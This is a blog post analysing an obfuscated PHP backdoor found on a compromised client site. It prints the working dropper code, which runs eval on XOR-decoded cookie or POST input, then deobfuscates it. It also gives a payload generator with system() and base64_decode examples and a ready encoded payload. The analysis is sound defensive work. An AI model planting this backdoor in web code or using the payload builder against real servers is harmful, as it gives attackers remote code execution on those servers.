---
layout: default
title: Obfuscated PHP Backdoor script analysis 1
date: 2018-08-09
categories: 
    - "php"
    - "obfuscation"
---
[home](/)


# {{ page.title }}

So, one of our clients have had some unwanted visitors, leaving a couple
of gifts, and I thought I would take a closer look at some of these.

One of the dropped files were a short .php file, with some obfuscated
code:

```php
<?php
$rrgdaww = 'b-x5mrc\'lsv6#ufp394n*Hig1_tae87yk2od';$lyqov = Array();$lyqov[] = $rrgdaww[21].$rrgdaww[20];$lyqov[] = $rrgdaww[12];$lyqov[] = $rrgdaww[28].$rrgdaww[17].$rrgdaww[24].$rrgdaww[0].$rrgdaww[14].$rrgdaww[11].$rrgdaww[30].$rrgdaww[35].$rrgdaww[1].$rrgdaww[30].$rrgdaww[14].$rrgdaww[33].$rrgdaww[0].$rrgdaww[1].$rrgdaww[18].$rrgdaww[33].$rrgdaww[14].$rrgdaww[14].$rrgdaww[1].$rrgdaww[29].$rrgdaww[11].$rrgdaww[35].$rrgdaww[3].$rrgdaww[1].$rrgdaww[16].$rrgdaww[27].$rrgdaww[27].$rrgdaww[3].$rrgdaww[24].$rrgdaww[27].$rrgdaww[30].$rrgdaww[3].$rrgdaww[14].$rrgdaww[33].$rrgdaww[28].$rrgdaww[17];$lyqov[] = $rrgdaww[6].$rrgdaww[34].$rrgdaww[13].$rrgdaww[19].$rrgdaww[26];$lyqov[] = $rrgdaww[9].$rrgdaww[26].$rrgdaww[5].$rrgdaww[25].$rrgdaww[5].$rrgdaww[28].$rrgdaww[15].$rrgdaww[28].$rrgdaww[27].$rrgdaww[26];$lyqov[] = $rrgdaww[28].$rrgdaww[2].$rrgdaww[15].$rrgdaww[8].$rrgdaww[34].$rrgdaww[35].$rrgdaww[28];$lyqov[] = $rrgdaww[9].$rrgdaww[13].$rrgdaww[0].$rrgdaww[9].$rrgdaww[26].$rrgdaww[5];$lyqov[] = $rrgdaww[27].$rrgdaww[5].$rrgdaww[5].$rrgdaww[27].$rrgdaww[31].$rrgdaww[25].$rrgdaww[4].$rrgdaww[28].$rrgdaww[5].$rrgdaww[23].$rrgdaww[28];$lyqov[] = $rrgdaww[9].$rrgdaww[26].$rrgdaww[5].$rrgdaww[8].$rrgdaww[28].$rrgdaww[19];$lyqov[] = $rrgdaww[15].$rrgdaww[27].$rrgdaww[6].$rrgdaww[32];foreach ($lyqov[7]($_COOKIE, $_POST) as $upqahri => $cmxizo){function qhdpi($lyqov, $upqahri, $qbwar){return $lyqov[6]($lyqov[4]($upqahri . $lyqov[2], ($qbwar / $lyqov[8]($upqahri)) + 1), 0, $qbwar);}function gwwsryf($lyqov, $mofkmwg){return @$lyqov[9]($lyqov[0], $mofkmwg);}function dhrqt($lyqov, $mofkmwg){$lqofrk = $lyqov[3]($mofkmwg) % 3;if (!$lqofrk) {eval($mofkmwg[1]($mofkmwg[2]));exit();}}$cmxizo = gwwsryf($lyqov, $cmxizo);dhrqt($lyqov, $lyqov[5]($lyqov[1], $cmxizo ^ qhdpi($lyqov, $upqahri, $lyqov[8]($cmxizo))));}
```

At first glance, this does not make much sense, though there are some
noticeable signs that should trigger the alarm bells:

-   The apparent use of obfuscation
-   The direct client interaction shown with \$\_COOKIE & \$\_POST
-   And the most alarming one, is the presence of the "eval" function

After cleaning it up abit, by adding some line breaks and indentation,
it starts to become clearer what is going on:

![](/Pictures/PHP01_01.png)



Its visible that:

-   A variable is initialized with some kind of string
-   An array is created with values concatenated from offsets in the
    above string
-   A loop over all key:value pairs from \$\_COOKIE & \$\_POST is
    happening
-   At some point an expression is evaluated

Let's take a look what the array contains after assignment:

```php
$lyqov = Array();
$lyqov[0] = "H*";
$lyqov[1] = "#";
$lyqov[2] = "e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9";
$lyqov[3] = "count";
$lyqov[4] = "str_repeat";
$lyqov[5] = "explode";
$lyqov[6] = "substr";
$lyqov[7] = "array_merge";
$lyqov[8] = "strlen";
$lyqov[9] = "pack";
```
  
A lot of those value looks unmistakably like the names of PHP functions.

Let's make the script more readable with some Search/Replace, replacing
all the array references with its corresponding array value, as well as
some quick renaming of functions, variables and parameters.

```php
$mainArray = Array();
$mainArray[0] = "H*";
$mainArray[1] = "#";
$mainArray[2] = "e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9";
$mainArray[3] = "count";
$mainArray[4] = "str_repeat";
$mainArray[5] = "explode";
$mainArray[6] = "substr";
$mainArray[7] = "array_merge";
$mainArray[8] = "strlen";
$mainArray[9] = "pack";

foreach (array_merge($_COOKIE, $_POST) as $key => $value){
	
	function func1($mainArray, $key, $func1_p3){
		return substr(str_repeat($key . "e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9", ($func1_p3 / strlen($key)) + 1), 0, $func1_p3);
	}
	
	function func2($mainArray, $func2_p2){
		return @pack("H*", $func2_p2);
	}
	
	function func3($mainArray, $func3_p2){
		
		$flag = count($func3_p2) % 3;

		if (!$flag) {
			eval($func3_p2[1]($func3_p2[2]));
			exit();
		}
	}

	$value = func2($mainArray, $value);

	func3($mainArray, explode("#", $value ^ func1($mainArray, $key, strlen($value))));
}
```


It now possible to see what is going on, but to fully understand the
functionality, I decided to take a deeper look by going through each
section, and doing some rewriting where's needed, as well as adding some
comments.

```php
  // mainArray is no longer needed

  // Iterate all cookie and post parameters
  foreach (array_merge($_COOKIE, $_POST) as $key => $value){
  
    // create repeating XOR cipher key to decipher $value
    function xorKey($key, $valueLen){
      // string substr ( string $string , int $start [, int $length ] )
      return substr(
        // string str_repeat ( string $input , int $multiplier )
        // Name of key used to deliver the payload, concatenated with some id eg. payloads are designed for specific targets, or atleast only accessible with id knowledge
        // Repeat xorKey to atleast length of $value
        str_repeat($key . "e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9", ($valueLen / strlen($key)) + 1),
        0,
        $valueLen
      );
    }
  
    // Get length of $value before conversion to bin
    $valueLen = strlen($value);

    // Convert a binary expression (e.g., "01000001 01000010 01000011") into a binary-string
    // Note : The @ is the error suppression operator in PHP! (Meaning any error in pack, will be ignored)
    $value = @pack("H*", $value);

    // XOR 
    /*
      $value : supplied XOR cipher payload from entry arrays
      $xorKey : XOR cipher key fitted to length of $value ($key."e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9") * times to be larger than length of $value
    */
    $payload = $value ^ xorKey($key, $valueLen);    
    
    // Create array for each element separated by "#"
    $payloadArr = explode("#", $payload);
    
    // is array length divisable by 3
    $flag = count($payloadArr) % 3;
    if (!$flag) {
      // success
      /*
        $payload[1] : function or method name, likely something like base64_decode or system
        $payload[2] : parameter for above function
      */
      eval($payloadArr[1]($payloadArr[2]));
      exit();
    }
    
  }
```

To summarise what is going on there, the script parses all parameters
provided in \$\_COOKIE & \$\_POST, looking for a key value pair, that
can be deciphered and on success evaluated.

Script flow:

1.  It iterates over all key:value pairs in $_COOKIE & $_POST,
    giving any client access to invoke this scripts functionality.

2.  To check if a key:value is a valid "payload", following is applied:

		a.  A repeating XOR cipher key is generated, based on key name and a "unique" id in the script.
		b.  The value is converted to binary.
		c.  XOR is then applied to the binary value, using previously generated key.
		d.  It is then made into an array, expecting each element is separated by "#".
		e.  If this array contains 3 (6,9..) elements, it's assumed a valid payload.

3.  If a valid payload was found, it is provided to the eval function,
    giving access to running any serverside code supplied!

4.  Script ends execution flow, if 1 valid payload is found, or when all
    key:value pairs have been processed.

We now know that a valid trigger would look something like this:

```php
$_POST = [
  "payload" => "0123456789abcdef"
];
```

To get a better look at what a payload would look like, I reversed the
functionality to be able to generate a valid payload.

```php
// Builds the payload, 3 examples, only 1st one is used
$payload = [
	// base64_decode("echo \"Hi\"; ")
	"unknwown",
	"base64_decode",
	base64_encode("echo \"Hi\"; "),
	
	// system('ls-lah')
	"unknwown",
	"system",
	"'ls-lah'",


	"unknwown",		// [0] Does not seem to be used, but could be to prevent accidentally processing "normal" parameters containing "#"
	"function_name",	// [1] Function name
	"function_param",	// [2] Function param
];

// Convert payload to string, separating entries by "#"
$payload = implode("#", $payload);

// Set a key name for the payload, used when delivering the payload to the target
$payloadKeyName = "payload";

// Set ID, used for either specific targets or as an access prevention to the specific backdoor script
$ID = "e91bf67d-7f2b-42ff-86d5-3aa51a75f2e9";

// Create repeating XOR cipher key from ($payloadKeyName & $ID)
$xorKey = str_repeat($payloadKeyName . $ID, (strlen($payload) / strlen($payloadKeyName)) + 1);

// XOR cipher the $payload using the $xorKey
$pXOR = $payload ^ $xorKey;

// Convert XOR'ed payload into a hexadecimal string
$finishedPayload = @unpack("H*", $pXOR);
```


That gives us following payload:
```php
[
"payload" => "050f1202180e130b1a530315530150725303510d4951113c316357541d744460260a5c7e18760845470b521e16161b0142171c4a45070b157e085a59047a2f4a78651e0e4c7e410a7c47405c"
]
```

And with a POST request to the initial script, we get a fine little "Hi"
message. =)

Oh and btw, VirusTotal had limited detection rate for this piece.

![](/Pictures/PHP01_02.png)



[home](/)

